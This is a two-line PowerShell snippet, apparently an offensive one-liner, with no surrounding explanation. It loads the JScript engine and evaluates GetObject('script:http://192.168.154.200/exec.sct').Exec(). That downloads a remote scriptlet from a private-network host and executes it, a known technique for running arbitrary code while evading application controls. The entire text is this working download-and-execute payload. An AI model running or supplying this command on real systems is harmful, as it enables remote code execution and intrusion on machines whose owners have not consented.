[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript')
[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http://192.168.154.200/exec.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
